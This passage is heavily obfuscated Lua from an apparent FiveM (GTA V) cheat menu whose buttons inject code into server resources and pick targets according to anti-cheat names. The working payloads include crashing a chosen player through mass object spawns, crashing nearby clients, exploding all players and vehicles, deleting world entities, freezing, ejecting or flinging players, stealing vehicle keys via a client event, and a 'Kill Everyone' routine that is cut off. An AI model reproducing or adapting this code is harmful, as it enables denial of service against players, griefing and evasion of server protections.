                local brows = RtYuIoPlMnBvCx(2)
                TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                DfGhJkLzXcVbNm(ped, 0)
                DfGhJkLzXcVbNm(ped, 1)
            end

            UxrKYLp378()
        ]]);end);MachoMenuButton(v40[1],"Kosatka Crash By ID",function() MachoInjectResource((v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or "any" ,[[
        local Config = {
    targetPlayerId = nil, -- We'll set this after listing players
    fragmentModel = "kosatka",
    waitTime = 2000,
    spawnAmount = 3000,
    debugMode = true -- Set to false in production
}

-- Logging system
local Log = {
    info = function(msg) print("^3[INFO]^7 " .. msg) end,
    success = function(msg) print("^2[SUCCESS]^7 " .. msg) end,
    error = function(msg) print("^1[ERROR]^7 " .. msg) end,
    warn = function(msg) print("^8[WARNING]^7 " .. msg) end,
    debug = function(msg)
        if Config.debugMode then
            print("^5[DEBUG]^7 " .. msg)
        end
    end
}

-- Utility functions
local Util = {
    requestModel = function(modelHash)
        RequestModel(modelHash)
        local startTime = GetGameTimer()
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
            if GetGameTimer() - startTime > 5000 then -- 5 second timeout
                Log.error("Model load timed out")
                return false
            end
        end
        return true
    end,

    getPlayerPed = function(serverId)
        return GetPlayerPed(GetPlayerFromServerId(serverId))
    end,

    getEntityCoords = function(entity)
        return DoesEntityExist(entity) and GetEntityCoords(entity) or nil
    end,

    listPlayers = function()
        local players = GetActivePlayers()
        print("^6Available players:^7")
        for _, playerId in ipairs(players) do
            local playerName = GetPlayerName(playerId)
            local serverID = GetPlayerServerId(playerId)
            print(string.format("^5ID: %d^7 | ^3Name: %s^7", serverID, playerName))
        end
    end,

    inputNumber = function(prompt)
        AddTextEntry('FMMC_KEY_TIP1', prompt)
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "", "", "", "", 10)
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end
        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            return tonumber(result)
        else
            Citizen.Wait(500)
            return nil
        end
    end,

    createObjectForTargetPlayer = function(modelHash, coords, targetPlayerId)
        local obj = CreateObject(modelHash, coords.x, coords.y, coords.z, true, false, true)
        if DoesEntityExist(obj) then
            local netId = NetworkGetNetworkIdFromEntity(obj)
            SetNetworkIdExistsOnAllMachines(netId, true)
            NetworkSetNetworkIdDynamic(netId, false)
            SetNetworkIdCanMigrate(netId, false)
            
            -- Make the object invisible to all players except the target
            Citizen.CreateThread(function()
                while DoesEntityExist(obj) do
                    SetEntityLocallyInvisible(obj)
                    Citizen.Wait(0)
                end
            end)
            
            -- Make it visible only for the target player
            local targetPlayerHandle = GetPlayerFromServerId(targetPlayerId)
            if targetPlayerHandle ~= -1 then
                SetNetworkIdSyncToPlayer(netId, targetPlayerHandle, true)
            end
            
            return obj
        end
        return nil
    end
}

-- Main functions
local function spawnFragmentObject(modelHash, coords, targetPlayerId)
    local obj = Util.createObjectForTargetPlayer(modelHash, coords, targetPlayerId)
    if DoesEntityExist(obj) then
        BreakObjectFragmentChild(obj, 1, true)
        Log.success("Object spawned, fragmented, and networked for target player.")
        return obj
    else
        Log.error("Failed to spawn object.")
        return nil
    end
end

local function cleanUp(objects)
    for _, obj in ipairs(objects) do
        if DoesEntityExist(obj) then
            DeleteEntity(obj)
        end
    end
    Log.success(string.format("Deleted %d objects.", #objects))
end

-- Main thread
Citizen.CreateThread(function()
    Util.listPlayers()
    Config.targetPlayerId = Util.inputNumber("Enter target player ID:")
    
    if not Config.targetPlayerId then
        Log.error("Invalid target player ID.")
        return
    end

    local modelHash = GetHashKey(Config.fragmentModel)
    local targetPed = Util.getPlayerPed(Config.targetPlayerId)
    local targetCoords = Util.getEntityCoords(targetPed)

    if not targetCoords then
        Log.error("Target player not found.")
        return
    end

    local success, errorMsg = pcall(function()
        if not Util.requestModel(modelHash) then
            error("Failed to load model")
        end

        local spawnedObjects = {}
        local spawnStart = GetGameTimer()
        local spawnTimeout = 10000 -- 10 seconds timeout for spawning all objects

        for i = 1, Config.spawnAmount do
            if GetGameTimer() - spawnStart > spawnTimeout then
                Log.error("Spawn process timed out")
                break
            end

            local obj = spawnFragmentObject(modelHash, targetCoords, Config.targetPlayerId)
            if obj then
                table.insert(spawnedObjects, obj)
                Log.debug(string.format("Spawned and networked object %d/%d for target player", #spawnedObjects, Config.spawnAmount))
            else
                Log.error(string.format("Failed to spawn object %d", i))
            end

            if i < Config.spawnAmount then
                Citizen.Wait(10)
            end
        end

        local spawnTime = GetGameTimer() - spawnStart
        Log.info(string.format("Spawned %d/%d objects in %d ms", #spawnedObjects, Config.spawnAmount, spawnTime))

        if #spawnedObjects > 0 then
            Log.info(string.format("Waiting for %d ms before cleanup", Config.waitTime))
            Citizen.Wait(Config.waitTime)

            local cleanupStart = GetGameTimer()
            cleanUp(spawnedObjects)
            local cleanupTime = GetGameTimer() - cleanupStart
            Log.info(string.format("Cleanup completed in %d ms", cleanupTime))
        else
            Log.warn("No objects were spawned, skipping cleanup")
        end

        SetModelAsNoLongerNeeded(modelHash)
    end)

    if not success then
        Log.error("An error occurred during script execution: " .. tostring(errorMsg))
    else
        Log.success("Script executed successfully")
    end
end)
    ]]);end);MachoMenuButton(v40[1],"Kick From Vehicle",function() local v188=MachoMenuGetSelectedPlayer();if (v188 and (v188>(0 -0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function GhJkUiOpLzXcVbNm()
                    local kJfHuGtFrDeSwQa = %d
                    local oXyBkVsNzQuH = _G.GetPlayerPed
                    local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                    local wQeRtYuIoPlMn = _G.PlayerPedId
                    local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                    local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                    local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                    local veh = yZaSdFgHjKlQ(targetPed, 0)

                    local function nMzXcVbNmQwErTy(func, ...)
                        local _print = print
                        local function errorHandler(ex)
                            -- _print("SCRIPT ERROR: " .. ex)
                        end

                        local argsStr = ""
                        for _, v in ipairs({...}) do
                            if type(v) == "string" then
                                argsStr = argsStr .. "\"" .. v .. "\", "
                            elseif type(v) == "number" or type(v) == "boolean" then
                                argsStr = argsStr .. tostring(v) .. ", "
                            else
                                argsStr = argsStr .. tostring(v) .. ", "
                            end
                        end
                        argsStr = argsStr:sub(1, -3)

                        local script = string.format("return func(%%s)", argsStr)
                        local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                        if not fn then
                            -- _print("Error loading script: " .. err)
                            return nil
                        end

                        local success, result = xpcall(function() return fn() end, errorHandler)
                        if not success then
                            -- _print("Error executing script: " .. result)
                            return nil
                        else
                            return result
                        end
                    end

                    if veh ~= 0 then
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                        ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                        
                        Wait(100)
                        nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                    end
                end

                GhJkUiOpLzXcVbNm()
            ]]):format(v188));end end);MachoMenuButton(v40[1035 -(125 + 909) ],"Freeze Player",function() local v189=1948 -(1096 + 852) ;local v190;while true do if (v189==(0 + 0)) then v190=MachoMenuGetSelectedPlayer();if (v190 and (v190>(0 -0))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VtQzAfXyYu()
                    local RqTfBnLpZo = %d
                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local wfjaw4dtdu = CreateThread
                    local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                    local tgtCoords = EoKdCjXqMg(tgtPed)
                    local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                    if not veh or veh == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    wfjaw4dtdu(function()
                        local start = CxZvBnMaSd()
                        while CxZvBnMaSd() - start < 3000 do
                            TeAxSpDoMj(
                                veh,
                                tgtPed,
                                0.0, 0.0, 10.0,
                                10.0, 0.0, 0.0,
                                true, 0, 0,
                                false, false, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VtQzAfXyYu()
            ]]):format(v190));end break;end end end);MachoMenuButton(v40[1],"Glitch Player",function() local v191=0 + 0 ;local v192;while true do if (v191==(512 -(409 + 103))) then v192=MachoMenuGetSelectedPlayer();if (v192 and (v192>(236 -(46 + 190)))) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function TnXmLoPrVq()
                    local kPdZoWxNq = %d

                    local LsKjHgFdSa = GetPlayerPed
                    local ZxCvBnMaQw = GetEntityCoords
                    local QtRvBnPoLs = GetClosestVehicle
                    local VcBgTrElMn = PlayerPedId
                    local KdJfGhTyPl = SetPedIntoVehicle
                    local TrLkUyIoPl = ClearPedTasks
                    local MwZlQxNsTp = NetworkRequestControlOfEntity
                    local AsYtGhUiMn = GetGameTimer
                    local WqErTyUiOp = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                    local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                    local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                    if not jCaBnErYqK or jCaBnErYqK == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    MwZlQxNsTp(veh)
                    Wait(100)
                    KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                    WqErTyUiOp(200)
                    TrLkUyIoPl(VcBgTrElMn())

                    CrXeTqLpVi(function()
                        local tGhXpLsMkA = AsYtGhUiMn()
                        local bErXnPoVlC = 3000

                        while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                            TeAxSpDoMj(
                                jCaBnErYqK,
                                xGyPtMdLoB,
                                0, 0, 0,
                                2000.0, 1460.928, 1000.0,
                                10.0, 88.0, 600.0,
                                true, true, true, false, 0
                            )
                            WqErTyUiOp(0)
                        end
                    end)
                end

                TnXmLoPrVq()
            ]]):format(v192));end break;end end end);MachoMenuButton(v40[96 -(51 + 44) ],"Limbo Player",function() local v193=0 + 0 ;local v194;while true do if (v193==0) then v194=MachoMenuGetSelectedPlayer();if (v194 and (v194>0)) then MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("oxmysql") and "oxmysql") or (v48("monitor") and "monitor") or "any" ,([[
                local function VyTxQzWsCr()
                    local lDxNzVrMpY = %d

                    local FgTrLpYwVs = GetPlayerPed
                    local EoKdCjXqMg = GetEntityCoords
                    local ZbLpVnXwQr = GetClosestVehicle
                    local WqErTyUiOp = PlayerPedId
                    local AsDfGhJkLz = SetPedIntoVehicle
                    local PoLiKjUhYg = ClearPedTasks
                    local QwErTyUiOp = NetworkRequestControlOfEntity
                    local CxZvBnMaSd = GetGameTimer
                    local VcMnBgTrEl = Wait
                    local TeAxSpDoMj = AttachEntityToEntityPhysically
                    local CrXeTqLpVi = CreateThread

                    local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                    local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                    local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                    if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                        print("No vehicle nearby | Aborting.")
                        return
                    end

                    QwErTyUiOp(veh)
                    Wait(100)
                    AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                    VcMnBgTrEl(200)
                    PoLiKjUhYg(WqErTyUiOp())

                    CrXeTqLpVi(function()
                        local kYqPmTnVzL = CxZvBnMaSd()
                        local yTbQrXlMwA = 3000
                        local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                        while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                            TeAxSpDoMj(
                                cHvBzNtEkQ,
                                vUpYrTnMwE,
                                0, 0, 0,
                                hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                                true, true, true, true, 0
                            )
                            VcMnBgTrEl(0)
                        end
                    end)
                end

                VyTxQzWsCr()
            ]]):format(v194));end break;end end end);MachoMenuButton(v40[1318 -(1114 + 203) ],"Copy Appearance",function() local v195=MachoMenuGetSelectedPlayer();if (v195 and (v195>0)) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function AsDfGhJkLqWe()
                    local ZxCvBnMqWeRt = %d
                    local UiOpAsDfGhJk = GetPlayerPed
                    local QwErTyUiOpAs = PlayerPedId
                    local DfGhJkLqWeRt = DoesEntityExist
                    local ErTyUiOpAsDf = ClonePedToTarget

                    local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                    if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                        local YpAsDfGhJkLq = QwErTyUiOpAs()
                        ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                    end
                end

                AsDfGhJkLqWe()
            ]]):format(v195));end end);MachoMenuButton(v40[727 -(228 + 498) ],"Steal Keys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local ped = GetPlayerPed(-1)
     local veh = GetVehiclePedIsIn((ped), true)  
     local plate = GetVehicleNumberPlateText(veh)
     TriggerEvent('vehiclekeys:client:SetOwner',plate)
        ]]);end);MachoMenuButton(v40[1 + 1 ],"Crash Nearby [Don't Spam]",function() MachoInjectResource((v48("ReaperV4") and "ReaperV4") or (v48("FiniAC") and "FiniAC") or (v48("WaveShield") and "WaveShield") or (v48("monitor") and "monitor") or "any" ,[[
            local function sfehwq34rw7td()
                local Nwq7sd2Lkq0pHkfa = CreateThread
                Nwq7sd2Lkq0pHkfa(function()
                    local hAx9qTeMnb = CreateThread
                    local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                    local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                    local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                    local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                    local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                    local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                    local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                    local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                    local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                    local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                    local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                    local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                    local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                    local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                    local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                    local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                    local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                    local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                    local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                    local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                    local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency

                    hAx9qTeMnb(function()
                        -- Get the player's ped and its coordinates/heading
                        local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                        local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                        local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                        local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above

                        -- Teleport player to high altitude
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                        -- Apply downward force to simulate falling
                        VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                        -- Wait 250ms to allow the fall to start
                        OplKvms9te(250)

                        -- Freeze player in place
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Equip player with a parachute
                        PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                        WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task

                        -- Freeze player again to prevent movement
                        DjRq08bKxu(QxoZnmWlae, true)

                        -- Load the "player_one" (Franklin) model
                        local UixZpvLoa9 = EkLnZmcTya("player_one")
                        YdWxVoEna3(UixZpvLoa9)
                        -- Wait until the model is loaded
                        while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                        -- Create a table to store created peds
                        local TzsPlcxQam = {}
                        -- Spawn 130 invisible peds at the player's location
                        for K9wo = 1, 130 do
                            local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                            if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                            end
                            OplKvms9te(1) -- Small delay to prevent freezing
                        end

                        -- Release the model from memory
                        KrXpTuwq9c(UixZpvLoa9)

                        -- Wait 300ms before cleaning up
                        OplKvms9te(300)

                        -- Delete all created peds (repeated calls may be for reliability)
                        for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                            if VdNzWqbEyf(bTzyPq7Xsl) then
                                AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                                AxWtRuLskz(bTzyPq7Xsl)
                            end
                        end

                        -- Unfreeze the player
                        DjRq08bKxu(QxoZnmWlae, false)

                        -- Find the ground Z-coordinate at the player's location
                        local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                        if not ZkxyPqtLs0 then
                            Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                        end

                        -- Wait 1 second before teleporting
                        OplKvms9te(1000)

                        -- Teleport player to just above ground level
                        Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                        DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                        DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                    end)
                end)
            end

            -- Execute the main function
            sfehwq34rw7td()
        ]]);end);MachoMenuButton(v40[2 + 0 ],"Cone Everyone",function() local v196=GetHashKey("prop_roadcone02a");RequestModel(v196);while  not HasModelLoaded(v196) do Wait(663 -(174 + 489) );end local function v197(v261) local v262=0 -0 ;local v263;local v264;local v265;while true do if (v262==(1907 -(830 + 1075))) then SetEntityCollision(v264,false,false);SetEntityInvincible(v264,true);v262=3;end if (v262==3) then SetEntityCanBeDamaged(v264,false);v265=GetPedBoneIndex(v261,31610 -(303 + 221) );v262=1273 -(231 + 1038) ;end if ((0 + 0)==v262) then if ( not DoesEntityExist(v261) or IsEntityDead(v261)) then return;end v263=GetEntityCoords(v261);v262=1163 -(171 + 991) ;end if ((4 -3)==v262) then v264=CreateObject(v196,v263.x,v263.y,v263.z,true,true,false);SetEntityAsMissionEntity(v264,true,true);v262=2;end if (v262==(10 -6)) then AttachEntityToEntity(v264,v261,v265,0 -0 ,0 + 0 ,0.25 -0 ,0,0 -0 ,0 -0 ,false,false,true,false,6 -4 ,true);break;end end end v197(PlayerPedId());for v266,v267 in ipairs(GetActivePlayers()) do v197(GetPlayerPed(v267));end local v198=(GetGamePool and GetGamePool("CPed")) or {} ;for v268,v269 in ipairs(v198) do if  not IsPedAPlayer(v269) then v197(v269);end end end);MachoMenuButton(v40[1250 -(111 + 1137) ],"Explode All Players",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function fGhJkLpOiUzXcVb()
                local aSdFgHjKlQwErTy = GetActivePlayers
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = GetEntityCoords
                local hGjFkDlSaPwOeIr = AddOwnedExplosion
                local tYuIoPaSdFgHjKl = PlayerPedId

                local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
                for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                    local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                    if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                        local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                        hGjFkDlSaPwOeIr(
                            tYuIoPaSdFgHjKl(),
                            nMzXcVbNmQwErTy.x,
                            nMzXcVbNmQwErTy.y,
                            nMzXcVbNmQwErTy.z,
                            6,     -- Explosion type
                            1.0,   -- Damage scale
                            true,  -- Audible
                            false, -- Invisible
                            0.0    -- Camera shake
                        )
                    end
                end
            end

            fGhJkLpOiUzXcVb()
        ]]);end);MachoMenuButton(v40[2],"Explode All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uYhGtFrEdWsQaZx()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = GetEntityCoords
                local vBnMkLoPiUyTrEw = AddOwnedExplosion
                local nMzXcVbNmQwErTy = PlayerPedId

                local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
                local me = nMzXcVbNmQwErTy()
                for _, veh in ipairs(_vehicles) do
                    if xAsDfGhJkLpOiUz(veh) then
                        local pos = cVbNmQwErTyUiOp(veh)
                        vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                    end
                end
            end
            uYhGtFrEdWsQaZx()
        ]]);end);MachoMenuButton(v40[160 -(91 + 67) ],"Delete All Vehicles",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXcVbNmQwErTyUi()
                local aSdFgHjKlQwErTy = GetGamePool
                local pOiUyTrEeRwQtYy = DoesEntityExist
                local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
                local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
                local tYuIoPaSdFgHjKl = DeleteEntity
                local yUiOpAsDfGhJkLz = PlayerPedId
                local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
                local gJkLoPiUyTrEqWe = GetGameTimer
                local fDeSwQaZxCvBnMm = Wait

                local me = yUiOpAsDfGhJkLz()
                local myVeh = uIoPaSdFgHjKlQw(me, false)

                local vehicles = aSdFgHjKlQwErTy("CVehicle")
                for _, veh in ipairs(vehicles) do
                    if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                        mNbVcCxZzLlKkJj(veh)
                        local timeout = gJkLoPiUyTrEqWe() + 500
                        while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                            fDeSwQaZxCvBnMm(0)
                        end
                        if hGjFkDlSaPwOeIr(veh) then
                            tYuIoPaSdFgHjKl(veh)
                        end
                    end
                end
            end
            zXcVbNmQwErTyUi()
        ]]);end);MachoMenuButton(v40[5 -3 ],"Delete All Peds",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qWeRtYuIoPlMnBv()
                local zXcVbNmQwErTyUi = GetGamePool
                local aSdFgHjKlQwErTy = DoesEntityExist
                local pOiUyTrEeRwQtYy = DeleteEntity
                local mNbVcCxZzLlKkJj = PlayerId
                local hGjFkDlSaPwOeIr = GetPlayerPed
                local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
                local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
                local uIoPaSdFgHjKlQw = GetGameTimer
                local gJkLoPiUyTrEqWe = Wait
                local vBnMkLoPiUyTrEw = IsPedAPlayer

                local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
                local peds = zXcVbNmQwErTyUi("CPed")

                for _, ped in ipairs(peds) do
                    if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                        tYuIoPaSdFgHjKl(ped)
                        local timeout = uIoPaSdFgHjKlQw() + 500
                        while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                            gJkLoPiUyTrEqWe(0)
                        end
                        if yUiOpAsDfGhJkLz(ped) then
                            pOiUyTrEeRwQtYy(ped)
                        end
                    end
                end
            end
            qWeRtYuIoPlMnBv()
        ]]);end);MachoMenuButton(v40[2],"Delete All Objects",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function mNqAzXwSeRdTfGy()
                local rTyUiOpAsDfGhJk = GetGamePool
                local xAsDfGhJkLpOiUz = DoesEntityExist
                local cVbNmQwErTyUiOp = DeleteEntity
                local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
                local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
                local yUiOpAsDfGhJkLz = GetGameTimer
                local uIoPaSdFgHjKlQw = Wait

                local objects = rTyUiOpAsDfGhJk("CObject")
                for _, obj in ipairs(objects) do
                    if xAsDfGhJkLpOiUz(obj) then
                        vBnMkLoPiUyTrEw(obj)
                        local timeout = yUiOpAsDfGhJkLz() + 500
                        while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                            uIoPaSdFgHjKlQw(0)
                        end
                        if nMzXcVbNmQwErTy(obj) then
                            cVbNmQwErTyUiOp(obj)
                        end
                    end
                end
            end
            mNqAzXwSeRdTfGy()
        ]]);end);MachoMenuButton(v40[1 + 1 ],"ShowIDs [New Feature]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local displayIDs = false -- toggles both self + nearby IDs

    function DrawText3D(x, y, z, text)
        local onScreen, _x, _y = World3dToScreen2d(x, y, z)
        if onScreen then
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(0.5, 0.5)
            SetTextColour(255, 255, 255, 255)
            SetTextEntry("STRING")
            AddTextComponentString(text)
            DrawText(_x, _y)
        end
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            -- Toggle both IDs with E
            if IsControlJustPressed(0, 38) then
                displayIDs = not displayIDs
            end

            if displayIDs then
                -- Draw own ID
                local playerId = GetPlayerServerId(PlayerId())
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.3, 0.3)
                SetTextColour(255, 255, 255, 255)
                SetTextEntry("STRING")
                AddTextComponentString("Your Player ID: " .. playerId)
                DrawText(0.5, 0.1)

                -- Draw nearby players' IDs
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                local players = GetActivePlayers()

                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local dist = #(playerCoords - targetCoords)

                        if dist < 40.0 then
                            local targetId = GetPlayerServerId(player)
                            DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                        end
                    end
                end
            end
        end
    end)
        ]]);end);MachoMenuCheckbox(v40[525 -(423 + 100) ],"Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
            aSwDeFgHiJkLoPx = true

            local function pLoMkIjUhbGyTf()
                local mAxPlErOy = PlayerPedId()
                local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
                local gBvTnCuXe = 100
                local aSdFgHjKl = 1000.0
                local lKjHgFdSa = 300.0

